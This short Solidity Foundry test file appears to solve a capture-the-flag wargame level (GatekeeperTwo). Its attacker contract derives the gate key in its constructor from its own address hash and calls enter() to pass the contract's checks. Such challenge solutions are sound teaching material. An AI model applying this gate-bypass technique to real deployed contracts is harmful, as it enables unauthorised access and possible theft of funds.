// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level14.sol";
import "forge-std/Test.sol";

contract ExploitLevel14 is Test {
    GatekeeperTwo instance = new GatekeeperTwo();

    function testExploit() external {
        new AttackGatekeeperOne(instance);
    }
}

contract AttackGatekeeperOne {
    GatekeeperTwo instance;

    constructor(GatekeeperTwo _instance) {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        bytes8 gateKey = bytes8(key);
        instance = _instance;
        instance.enter(gateKey);
    }
}
